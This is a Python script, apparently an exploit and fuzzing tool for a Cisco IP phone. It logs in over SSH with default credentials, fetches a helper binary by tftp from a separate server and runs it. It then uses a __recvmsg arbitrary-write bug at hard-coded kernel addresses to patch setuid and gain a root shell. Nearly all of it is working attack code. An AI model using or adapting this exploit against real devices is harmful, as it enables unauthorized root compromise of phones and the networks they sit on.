import pexpect, sys, time, re, random, struct, argparse


def mallocMem(s):
    s.sendline('m')
    s.expect('FuZ\\>')
    
    lines = filter(lambda x: len(x)>0, map(lambda x: x.strip(), s.before.split('\n')))
    memLoc = int(lines[-1].split()[0], 16)
    memSize = 0x100
    print "Allocated @ 0x%x size: 0x%x"%(memLoc, memSize)
    return (memLoc,memSize)

def writeMem(s, memLoc, memVals):
    s.sendline('w')

    for val in memVals:
        s.expect('MEMLOC:')
        s.sendline("0x%08x"%(memLoc))
        print "The memory is written @ 0x%x"%(memLoc)
        s.expect('MEMVAL:')
        s.sendline("0x%08x"%(val))
        print "The content of written is 0x%08x" %(val)
        memLoc += 4

    s.expect('MEMLOC:')
    s.sendline("0x%08x"%(0))
    s.expect('MEMVAL:')
    s.sendline("0x%08x"%(0))
    s.expect('FuZ\\>')

def readMem(s, loc):
    s.sendline('r')

    s.expect('MEMLOC:')
    s.sendline("0x%08x"%(loc))
    s.expect('FuZ\\>')

    memVals = s.before

    mLines = memVals.strip().split('\n')
    mVals = []
    for mL in mLines:
        mParts = map(lambda x: int(x, 16), mL.split()[1:])
        mVals += mParts 

    print mVals
    return mVals
    
def freeMem(s, loc):
    s.sendline('F')
    s.expect('MEMLOC:')
    s.sendline("0x%08x"%(loc))
    s.expect('FuZ\\>')

def fillMemRand(s, loc, len=25):
    writeMem(s, loc, [random.randint(0, 0xffffffff) for x in range(0,len)])

def memFuzzTest(s):
    memLocs = []

    patternVal = 0x41414141
    while True:
        for i in range(0,1000):
            print "Malloc"
            memLoc, memSize = mallocMem(s)
            memLocs.append(memLoc)

            print "Fill 0x%08x"%(memLoc)
            writeVals = [patternVal]*25
            patternVal +=1
            writeMem(s, memLoc, writeVals)

            print "Malloc 0x%08x"%(memLoc)

        #print "Print"
        #print readMem(s, memLoc)
        for memLoc in memLocs:
            print "Free 0x%08x"%(memLoc)
            freeMem(s, memLoc)


def fuzzSysRecvMsg(s):
    sysNum = 0x1b
    sysName = '__recvmsg'
    sysType = 100

    """
    [val1, ptr_1, target_val]
    val1 = 0?
    ptr_1 + 0x18 = target addr
    tarvet_val should be written to target addr
    """

    print "SetUID to 0"
    memLoc0, memSize = mallocMem(s)
    writeMem(s, memLoc0, [0x0])
    print fuzzSysCall(s, 0x17, '__setuid', memLoc0, 100)

    print "Root me"


    patches = [0x8008C7F4, 0x8008C7CC, 0x8008C81C, 0x8008C8A4]

    memLoc1, memSize = mallocMem(s)

    for pLoc in patches:
        argList = [0, pLoc-0x18, 0x0000c021]
        writeMem(s, memLoc1, argList)
        print readMem(s, memLoc1)
        print 'fuzz of destiny'
        print fuzzSysCall(s, sysNum, sysName, memLoc1, 100)



    print "SetUID to 0"
    memLoc0, memSize = mallocMem(s)
    writeMem(s, memLoc0, [0x0])
    print fuzzSysCall(s, 0x17, '__setuid', memLoc0, 100)

    s.interact(escape_character='~')

    #print 'now for the crash'
    #print fuzzSysCall(s, sysNum, sysName, 0x12345678, 100)

def fuzzSysSigAction(s):
    sysNum = 0x156
    sysName = '__sigaction'
    sysType = 100
    
    """argument: list of three pointers to three values"""
    """[val_1, val_2, ptr_3]

    val_1 less than 0x1D
    ptr_3 points to where we want to write

    """

    print fuzzSysCall(s, 0x18, '__getuid', 0x00000000, 100)
    #for i in range(0,32):

    vals = [0x10, 0x100, 0x8012a340]
    memLoc1, memSize = mallocMem(s)
    writeMem(s, memLoc1, vals)
    
    print fuzzSysCall(s, sysNum, sysName, memLoc1, 100)



    print fuzzSysCall(s, 0x18, '__getuid', 0x00000000, 100)

def patchKernel(s, targetLoc, data, debug=True):
    endLoc = len(data)+targetLoc

    writeReqs = []
    tLoc = targetLoc
    for i in range(0, len(data), 4):
        try:
            wData = data[i:i+4]
        except:
            wData = data[i:]

        writeReqs.append((tLoc, wData))
        #print writeReqs
        tLoc += len(wData)

    print writeReqs
    writeReqs.reverse()
    print writeReqs

    k = 0;
    for loc, data in writeReqs:
        print "call the _patchKernel"        
        if k < 1:     
           _patchKernel(s, loc, data, debug)
           k = k + 1
        print "%d"%(k)

def _patchKernel(s, targetLoc, data, debug=True):
    sysNum = 0x1b
    sysName = '__recvmsg'
    sysType = 100


    memLoc1, memSize = mallocMem(s)

    if debug:
        memLoc2, memSize = mallocMem(s)
        writeMem(s, memLoc2, [0x41414141]*100)

    i = 0

    if not debug:
        memLoc2 = targetLoc

    print "TargetLoc: 0x%08x"%(memLoc2)
    print "%d"%(len(data))       
    print map(lambda x: hex(x), range(memLoc2, memLoc2+len(data), 4))

    nopLocs = []
    wroteData = []
    for pLoc in range(memLoc2, memLoc2+len(data), 4):
        
        if len(data)>i+4:
            pVals = data[i:i+4]
        else:
            pVals = data[i:]+"\x00\x00\x00"
            pVals = pVals[0:4]

        packedData = struct.unpack(">I", pVals)[0]
        print packedData
        wroteData.append(packedData)

        argList = [0, pLoc-0x18, packedData]
        if packedData == 0:
            i += 4
            nopLocs.append(pLoc)
            continue

        print argList
        #readMem (s,memLoc1)
        writeMem(s, memLoc1, argList)
        #readMem (s,memLoc1)
        fuzzSysCall(s, sysNum, sysName, memLoc1, 100)
        i += 4
        print "Loaded 0x%08x to Addr: 0x%08x"%(packedData, pLoc)

    for pLoc in nopLocs:
        argList = [0, pLoc-0x18, 0]
        writeMem(s, memLoc1, argList)
        print "the last system call"
        fuzzSysCall(s, sysNum, sysName, memLoc1, 100)

    if debug:
        verifyMem(s, memLoc2, wroteData)

def printKernelMemory(s, targetAddr, tSize):
    for addr in range(targetAddr, targetAddr+tSize, 0x400):
        print fuzzSysCall(s, 0x37, '__sysReboot', addr, 100)

def triggerSysReboot(s):
    print fuzzSysCall(s, 0x37, '__sysReboot', 0x80082840, 100)

def verifyMem(s, targetLoc, wroteData):
    print "VERIFYING MEMORY"
    wVals = readMem(s, targetLoc)
    
    for i in range(0,len(wroteData)):
        isSame = '='
        if (wroteData[i] != wVals[i]):
            isSame = '!'
            print "%s 0x%08x - 0x%08x"%(isSame, wroteData[i], wVals[i])
        #else:
        #    print "%s 0x%08x - 0x%08x"%(isSame, wroteData[i], wVals[i])


def fuzzSysKill(s):
    """kill takes a list of two pointers"""

    print "Fuzzing syscall - __kill"
    print "="*40

    sysNum = 0x25
    sysName = '__kill'
    sysType = 0

    while True:
        memLoc1, memSize = mallocMem(s)    
        memLoc2, memSize = mallocMem(s)
        memLoc3, memSize = mallocMem(s)
        
        writeMem(s, memLoc1, [memLoc2, memLoc3])
        fillMemRand(s, memLoc2)
        fillMemRand(s, memLoc3)
        
        print fuzzSysCall(s, sysNum, sysName, memLoc1, sysType)

    
fuzzerLookup = {}
fuzzerLookup['__kill'] = fuzzSysKill
fuzzerLookup['__sigaction'] = fuzzSysSigAction
fuzzerLookup['__recvmsg'] = fuzzSysRecvMsg

def sendCmd(s, cmd):
    s.sendline(cmd)
    s.expect(['\\$', '\\#'])
    return s.before

def _startFuzz(phone_addr, tftp_server):
    s = pexpect.spawn('ssh -l cisco %s' % phone_addr)
    #s.logfile = sys.stdout
    sshKeyStr = re.escape("(yes/no)?")
    expVal = s.expect(["password:", sshKeyStr], timeout=120)

    if expVal == 1:
        s.sendline('yes')
        expVal = s.expect("password:", timeout=120)

    s.sendline('session')

    s.expect("login:")
    s.sendline('default')

    s.expect("password:")
    s.sendline('user')

    s.expect(["\\$", "\\#"])

    phoneUname = sendCmd(s, 'uname -a')
    print "Login Successfull"
    print phoneUname

    coreDump = getKernelCoreDump(s)

    #print "Previous core dump"
    #print coreDump

    sendCmd(s, """tftp -s %s login1 /tmp/login1
chmod a+x /tmp/login1""" % (tftp_server))

    s.sendline("/tmp/login1")
    s.expect("FuZ\\>")

    return s, coreDump

def startFuzz(phone_addr, tftp_server):
    while True:
        print "attempting to connect to phone"
        try:
            return _startFuzz(phone_addr, tftp_server)
        except Exception, e:
            print e

def isAlive(s):
    try:
        s.sendline('\n')
        s.expect('FuZ\\>')
        return True
    except:
        s.kill(0)
        return False

def getKernelCoreDump(s):
    print "retreiving kernel core dump"
    #s.sendline('/flash0/bin/cvw /tmp/kernel.core')
    #s.expect(["\\$", "\\#"])

    return s.before

def fuzzSysCall(s, callNum, callName, argValue, syscallType):
    print "Fuzzing syscall - 0x%x (%s) sysArg type: 0x%x"%(callNum,callName, syscallType)
    print "="*40

    callNum = "0x%08x"%(callNum)
    argValue = "0x%08x"%(argValue)

    s.sendline('f')
    s.expect('SysCallNum\\:')
    s.sendline(callNum)
    s.expect('SysCallArg\\:')
    s.sendline(argValue)
    s.expect('FuZ\\>')

    print "="*40

    return s.before


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='meow')
    parser.add_argument('--rootme', action='store_true')
    parser.add_argument('--host')
    parser.add_argument('--local')

    args = parser.parse_args()

    phone_addr = args.host
    tftp_addr = args.local

    if phone_addr is None or tftp_addr is None:
        parser.print_help()
        exit(1)

    s, coreDump = startFuzz(phone_addr, tftp_addr)

    sysRebootAddr = 0x800827B8

    if args.rootme:
        setuidAddr = 0x8008CB0C
        patchKernel(s, setuidAddr, "\xac\x60\x00\x14\xac\x60\x00\x04\xac\x60\x00\x18", debug=False)
        #fuzzSysRecvMsg(s)

